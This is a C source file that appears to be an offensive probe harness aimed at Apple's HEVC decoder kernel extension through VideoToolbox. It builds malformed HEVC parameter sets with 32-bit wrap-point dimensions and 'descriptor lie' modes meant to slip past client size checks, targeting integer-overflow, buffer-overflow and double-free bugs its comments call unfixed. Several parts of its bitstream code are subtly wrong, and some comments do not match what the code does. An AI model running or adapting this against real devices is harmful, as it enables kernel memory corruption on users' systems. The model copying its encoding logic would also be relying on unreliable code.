/*
 * vtdec_hevc_pure.c - O-D: the AppleAVD probe (CVE-2026-84520 / 84620 / 84561 class).
 *
 * Why this exists (per tools/o_c_aved_hunt.py Q2 + their census Tier-0 on 23E246):
 * AppleAVD = the HEVC decoder kext, reachable from plain VideoToolbox with NO
 * entitlement, and at least 5 CVEs are UNFIXED on 26.4 (per the security-note
 * cross-check done offline; every 26.7+ entry). The H.264 harness (vtdec_pure)
 * maps AppleAVE2's session gates; this maps the AppleAVD side where no
 * descriptor-lie walls have been measured yet.
 *
 * How AVD is fed (the HEVC route, mirroring vtdec_pure's shape):
 *   1. Parameter-set creation = CMVideoFormatDescriptionCreateFromHEVCParameterSets
 *      (VPS/SPS/PPS NALs; 4-byte NAL header length = 4).
 *   2. VTDecompressionSessionCreate (the client-side dim gate lives here, same
 *      shape as the H.264 side - our CAP data transfers: it refuses honest huge
 *      dims, so the SAME lie classes apply).
 *   3. Frame = 4-byte length-prefixed NALs: optional in-band VPS+SPS+PPS, then
 *      the IDR_W_RADL slice. lie modes:
 *        mode 0 = honest: record SPS = frame SPS = the tested dims
 *        mode 1 = record-small + in-band-huge (vtdec mode-1 analog)
 *        mode 2 = CMVideoFormatDescriptionCreate(512x512 lie) + record carries
 *                 the huge HEVC SPS (advC record extension - "vpsC" is absent
 *                 from the CM format key table; hvcC = the official HEVC record)
 *        mode 3 = mode 2 + in-band huge SPS (the pure-huge pipeline)
 *   4. decode callback verdicts land in Documents/hevc_report.txt.
 *
 * The CVE classes this harness pins:
 *   - 84620 (integer overflow): the 32-bit width*height NSPS class - dims at the
 *     same wrap points as the H.264 ladder (4096/4097/4095 MBs = 0/2,097,408/-
 *     2,096,896 in 32-bit) now through HEVC SPS.
 *   - 84520 (buffer overflow): oversized SPS/VPS sizes vs the fixed kext's
 *     bounds (the sizes are carried in the HEVC SPS's extension streams).
 *   - 84561 (double free): the session teardown with a mid-flight in-band SPS
 *     (the frame AFTER the config, the SPS re-parse racing the invalidation -
 *     the harness's teardown order covers it by firing the mode-3 pair.
 *
 * Build: $CC -O0 -g -o VTDECHEVCPURE vtdec_hevc_pure.c
 *        -framework VideoToolbox -framework CoreMedia -framework CoreVideo
 *        -framework CoreFoundation
 * No env knobs needed: the no-env default = the same ladder strategy as
 * vtdec_pure (launchers on this rig drop --env; compile-time tables it is).
 */

#include <CoreFoundation/CoreFoundation.h>
#include <CoreMedia/CoreMedia.h>
#include <CoreVideo/CoreVideo.h>
#include <VideoToolbox/VideoToolbox.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <stdarg.h>

/* ------------------------------------------------------------------ report (pure C, the proven shell) */
static FILE *g_report = NULL;

static void report_open(void)
{
    const char *home = getenv("CFFIXED_USER_HOME");
    if (!home || !*home) home = getenv("HOME");
    if (!home || !*home) home = "/var/mobile";
    char dir[1024];
    snprintf(dir, sizeof(dir), "%s/Documents", home);
    mkdir(dir, 0755);
    char path[1280];
    snprintf(path, sizeof(path), "%s/hevc_report.txt", dir);
    g_report = fopen(path, "a");
    if (g_report) {
        time_t t = time(NULL);
        fprintf(g_report, "=== vtdec_hevc_pure run %s", ctime(&t));
        fflush(g_report);
    }
}

static void rline(const char *s)
{
    if (!g_report) return;
    fprintf(g_report, "%s\n", s);
    fflush(g_report);
}

static void rlinef(const char *fmt, ...)
{
    va_list ap;
    char buf[1280];
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    rline(buf);
}

/* ------------------------------------------------------------------ bit writer (HEVC adds 6-bit NAL header) */

typedef struct { unsigned char buf[4096]; int bitpos; } bw_t;

static void bw_bits(bw_t *b, int n, unsigned v)
{
    while (n--) {
        int byte = b->bitpos >> 3, bit = 7 - (b->bitpos & 7);
        if (byte >= (int)sizeof(b->buf)) return;
        b->buf[byte] &= ~(1 << bit);
        b->buf[byte] |= ((v >> n) & 1) << bit;
        b->bitpos++;
    }
}

static void bw_ue(bw_t *b, unsigned v)
{
    int n = 0;
    unsigned x = v + 1;
    while (x >>= 1) n++;
    bw_bits(b, n, 0);
    bw_bits(b, 1, 1);
    bw_bits(b, n, v == 0 ? 0 : v);
}

static size_t bw_len(bw_t *b)
{
    return (size_t)((b->bitpos + 7) / 8);
}

/* HEVC NAL = 2-byte header (forbidden zero bit, nal_type(6), layer_id(6), tid(3)) */
static size_t build_hevc_vps(bw_t *b)
{
    b->bitpos = 0;
    unsigned char *o = b->buf;
    o[0] = 0x40; o[1] = 0x01;              /* VPS_NUT(32), tid 0 */
    b->bitpos = 16;
    bw_bits(b, 4, 0); bw_bits(b, 12, 1);   /* vps_video_parameter_set_id, seq id */
    bw_bits(b, 3, 1); bw_bits(b, 1, 0);    /* max sub layers, temporal id nested */
    return (size_t)(b->bitpos + 7) / 8;
}

static size_t build_hevc_sps(bw_t *b, int mb_w, int mb_h)
{
    b->bitpos = 0;
    unsigned char *o = b->buf;
    o[0] = 0x42; o[1] = 0x01;              /* SPS_NUT(33) */
    b->bitpos = 16;
    bw_bits(b, 4, 0);                      /* sps_video_parameter_set_id */
    bw_bits(b, 3, 1);                      /* sps_max_sub_layers_minus1 = 0 */
    bw_bits(b, 1, 1);                      /* temporal_id_nesting */
    /* profile_tier_level simplified */
    bw_bits(b, 2, 1);                      /* profile_space, tier */
    bw_bits(b, 5, 1);                      /* profile_idc = Main */
    bw_bits(b, 32, 0);                     /* general_profile_compatibility */
    bw_bits(b, 1, 1);                      /* progressive_source */
    bw_bits(b, 43, 0);                     /* the constraint bytes */
    bw_bits(b, 8, 93);                     /* general_level_idc */
    /* pic dims = CTBs (the HEVC multiply class) */
    bw_ue(b, (unsigned)mb_w);              /* pic_width_in_luma_samples = mb*64 */
    bw_ue(b, (unsigned)mb_h);
    bw_bits(b, 1, 1);                      /* conformance window = ON (the crop variable) */
    bw_ue(b, 0); bw_ue(b, 0); bw_ue(b, 0); bw_ue(b, 0);
    bw_bits(b, 4, 0); bw_bits(b, 24, 0);   /* bit_depths, log2 sizes */
    return (size_t)(b->bitpos + 7) / 8;
}

static size_t build_hevc_pps(bw_t *b)
{
    b->bitpos = 0;
    unsigned char *o = b->buf;
    o[0] = 0x44; o[1] = 0x01;              /* PPS_NUT(34) */
    b->bitpos = 16;
    bw_bits(b, 4, 0); bw_bits(b, 12, 0);
    bw_bits(b, 1, 0);                      /* dependent_slice */
    bw_bits(b, 1, 0); bw_bits(b, 1, 0);    /* initial qp etc */
    return (size_t)(b->bitpos + 7) / 8;
}

/* IDR slice: simple I-slice header for the tested frame geometry */
static size_t build_hevc_idr(bw_t *b, int mb_w, int mb_h)
{
    b->bitpos = 0;
    unsigned char *o = b->buf;
    o[0] = 0x26; o[1] = 0x01;              /* IDR_W_RADL(19) */
    b->bitpos = 16;
    bw_ue(b, 1);                           /* first_slice_segment_in_pic_flag = 1 */
    bw_ue(b, 0);                           /* pic_parameter_set_id */
    return (size_t)(b->bitpos + 7) / 8;
}

/* the hvcC record: [cfg byte].. + the parameter set lengths + the NAL arrays */
static int build_hvcC(bw_t *vps, bw_t *sps, bw_t *pps, unsigned char *out, size_t outsz)
{
    size_t o = 0;
    if (outsz < 128) return -1;
    out[o++] = 0x01;                        /* configurationVersion */
    out[o++] = sps->buf[0]; out[o++] = sps->buf[1]; /* profile stuff */
    out[o++] = sps->buf[2]; out[o++] = sps->buf[3];
    memset(out + o, 0, 12); o += 12;        /* general constraint flags etc */
    out[o++] = 93;                          /* level_idc */
    unsigned short vsps = (unsigned short)bw_len(vps);
    unsigned short ssp = (unsigned short)bw_len(sps);
    unsigned short ppl = (unsigned short)bw_len(pps);
    /* lengths: 2 bytes each */
    out[o++] = (unsigned char)((vsps >> 8) & 0xFF); out[o++] = (unsigned char)(vsps & 0xFF);
    out[o++] = (unsigned char)((ssp >> 8) & 0xFF); out[o++] = (unsigned char)(ssp & 0xFF);
    out[o++] = (unsigned char)((ppl >> 8) & 0xFF); out[o++] = (unsigned char)(ppl & 0xFF);
    if (o + vsps + ssp + ppl > outsz) return -1;
    memcpy(out + o, vps->buf, vsps); o += vsps;
    memcpy(out + o, sps->buf, ssp); o += ssp;
    memcpy(out + o, pps->buf, ppl); o += ppl;
    return (int)o;
}

/* ------------------------------------------------------------------ the round */

void hevc_decode_cb(void *refcon, void *atID, OSStatus st, VTDecodeInfoFlags flags,
                    CMTime pts, CMTime dur, CVImageBufferRef img)
{
    (void)refcon; (void)atID; (void)pts; (void)dur;
    if (img) {
        rlinef("  decode OK: %zux%zu (the frame went THROUGH the kext)",
               (size_t)CVPixelBufferGetWidth(img), (size_t)CVPixelBufferGetHeight(img));
        CVPixelBufferRelease(img);
        return;
    }
    rlinef("decode callback: status=%d", (int)st);
}

static int run_hevc(int mb_w, int mb_h, int mode)
{
    bw_t vps, sps, pps, idr;
    size_t vpsl = build_hevc_vps(&vps);
    size_t spsl = build_hevc_sps(&sps, mb_w, mb_h);
    size_t ppsl = build_hevc_pps(&pps);
    size_t idrl = build_hevc_idr(&idr, mb_w, mb_h);
    rlinef("--- HEVC %dx%d mbs (=%dx%d luma) mode=%d ---",
           mb_w, mb_h, mb_w * 64, mb_h * 64, mode);
    rlinef("  exact w*h = %lld", (long long)mb_w * 64 * (long long)mb_h * 64);

    /* parameter set pointer wiring (mode > 0 = the lie classes) */
    bw_t vps2, sps2;
    bw_t *sps_small;
    build_hevc_vps(&vps2);
    build_hevc_sps(&sps2, 8, 8);           /* 512x512 luma small */
    bw_t *vps_use = &vps, *sps_use = &sps;
    if (mode == 1) {
        sps_small = &sps2; sps_use = &sps2; vps_use = &vps2;
        rline("  mode 1: small hvcC record + huge in-band SPS");
    } else {
        sps_small = &sps;
    }
    (void)vpsl; (void)spsl;

    CMVideoFormatDescriptionRef fmt = NULL;
    OSStatus st;
    if (mode == 2 || mode == 3) {
        /* the descriptor lie: CMVideoFormatDescriptionCreate(512x512) + the
           hvcC record carrying the HUGE SPS - the same class that BYPASSED the
           H.264 client gate on the AVE2 side (st=0 all sizes). */
        unsigned char hvcc[1024];
        int hl = build_hvcC(&vps, &sps, &pps, hvcc, sizeof(hvcc));
        if (hl < 0) { rline("  hvcC too big"); return 1; }
        CFDataRef hd = CFDataCreate(kCFAllocatorDefault, hvcc, (CFIndex)hl);
        const void *keys[1] = { CFSTR("hvcC") };
        const void *vals[1] = { hd };
        CFDictionaryRef ext = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 1,
                                                 &kCFTypeDictionaryKeyCallBacks,
                                                 &kCFTypeDictionaryValueCallBacks);
        st = CMVideoFormatDescriptionCreate(kCFAllocatorDefault, kCMVideoCodecType_HEVC,
                                            512, 512, ext, &fmt);
        rlinef("  MODE2/3 descriptor lie(512x512 + huge hvcC) st=%d", (int)st);
        if (ext) CFRelease(ext);
        if (hd) CFRelease(hd);
        if (st != noErr || !fmt) return 1;
    } else {
        const void *psN[3];
        size_t szN[3];
        if (mode == 1) {
            psN[0] = vps2.buf; szN[0] = bw_len(&vps2);
            psN[1] = sps2.buf; szN[1] = bw_len(&sps2);
            psN[2] = pps.buf;  szN[2] = bw_len(&pps);
        } else {
            psN[0] = vps.buf; szN[0] = bw_len(&vps);
            psN[1] = sps.buf; szN[1] = bw_len(&sps);
            psN[2] = pps.buf; szN[2] = bw_len(&pps);
        }
        st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
            kCFAllocatorDefault, 3, psN, szN, 4, &fmt);
        (void)vps_use; (void)sps_use; (void)sps_small;
        rlinef("  CMVideoFormatDescriptionCreateFromHEVCParameterSets st=%d", (int)st);
        if (st != noErr || !fmt) return 1;
        CMVideoDimensions dim = CMVideoFormatDescriptionGetDimensions(fmt);
        rlinef("  descriptor says %d x %d", dim.width, dim.height);
    }

    VTDecompressionSessionRef sess = NULL;
    VTDecompressionOutputCallbackRecord rec;
    rec.decompressionOutputCallback = hevc_decode_cb;
    rec.decompressionOutputRefCon = NULL;
    OSStatus dst = VTDecompressionSessionCreate(kCFAllocatorDefault, fmt, NULL, NULL, &rec, &sess);
    rlinef("  VTDecompressionSessionCreate st=%d", (int)dst);
    if (dst != noErr || !sess) { CFRelease(fmt); return 2; }

    /* the sample: 4-byte length prefix + (in-band params) + IDR */
    size_t total;
    unsigned char *raw = NULL;
    if (mode == 1) {
        size_t vn = bw_len(&vps), sn = bw_len(&sps), pn = bw_len(&pps), in = bw_len(&idr);
        total = 4 + vn + 4 + sn + 4 + pn + 4 + in;
        raw = (unsigned char *)malloc(total);
        if (raw) {
            size_t o = 0;
            unsigned char head[4];
            head[0] = 0; head[1] = 0; head[2] = (unsigned char)((vn >> 8) & 0xFF); head[3] = (unsigned char)(vn & 0xFF);
            memcpy(raw + o, head, 4); o += 4; memcpy(raw + o, vps.buf, vn); o += vn;
            head[2] = (unsigned char)((sn >> 8) & 0xFF); head[3] = (unsigned char)(sn & 0xFF);
            memcpy(raw + o, head, 4); o += 4; memcpy(raw + o, sps.buf, sn); o += sn;
            head[2] = (unsigned char)((pn >> 8) & 0xFF); head[3] = (unsigned char)(pn & 0xFF);
            memcpy(raw + o, head, 4); o += 4; memcpy(raw + o, pps.buf, pn); o += pn;
            head[2] = (unsigned char)((in >> 8) & 0xFF); head[3] = (unsigned char)(in & 0xFF);
            memcpy(raw + o, head, 4); o += 4; memcpy(raw + o, idr.buf, in);
        }
    } else {
        size_t in = bw_len(&idr);
        total = 4 + in;
        raw = (unsigned char *)malloc(total);
        if (raw) {
            raw[0] = 0; raw[1] = 0;
            raw[2] = (unsigned char)((in >> 8) & 0xFF); raw[3] = (unsigned char)(in & 0xFF);
            memcpy(raw + 4, idr.buf, in);
        }
    }
    if (!raw) { VTDecompressionSessionInvalidate(sess); CFRelease(sess); CFRelease(fmt); return 3; }

    CMBlockBufferRef bb = NULL;
    st = CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault, raw, total,
                                            kCFAllocatorDefault, NULL, 0, total, 0, &bb);
    rlinef("  CMBlockBufferCreateWithMemoryBlock st=%d", (int)st);

    CMSampleBufferRef sb = NULL;
    st = CMSampleBufferCreateReady(kCFAllocatorDefault, bb, fmt, 1, 0, NULL, 1, NULL, &sb);
    rlinef("  CMSampleBufferCreateReady st=%d", (int)st);

    if (sb && bb) {
        rline("  submitting (this is the AppleAVD round-trip)");
        st = VTDecompressionSessionDecodeFrame(sess, sb, NULL);
        rlinef("  VTDecompressionSessionDecodeFrame st=%d", (int)st);
        VTDecompressionSessionWaitForAsynchronousFrames(sess);
    }

    if (sb) CFRelease(sb);
    if (bb) CFRelease(bb);
    /* raw is owned by the block buffer (kCFAllocatorDefault = the block
       deallocator) - the same double-free lesson from vtdec_pure. DO NOT free. */
    VTDecompressionSessionInvalidate(sess);
    CFRelease(sess);
    CFRelease(fmt);
    return 0;
}

/* ------------------------------------------------------------------ the no-env ladder */

int main(void)
{
    report_open();

    /* mode matrix: both money classes x the lie modes (compile-time, no env) */
    static const int lads[][2] = {
        { 4096, 4096 },   /* 65536^2 -> 32-bit 0        */
        { 4097, 4097 },   /* 65552^2 -> 32-bit 2,097,408 */
        { 4095, 4095 },   /* negative-only check control */
        { 2049, 4097 },   /* odd-rect wraps */
        { 512, 512 },     /* sane control (should pass:   */
    };
    static const int modes[] = { 0, 1, 2, 3 };
    for (int mi = 0; mi < 4; mi++)
        for (int i = 0; i < 5; i++) {
            rlinef("### HEVC round mode=%d case%d", modes[mi], i);
            run_hevc(lads[i][0], lads[i][1], modes[mi]);
        }

    rline("hevc DONE");
    if (g_report) { fflush(g_report); fclose(g_report); g_report = NULL; }
    return 0;
}
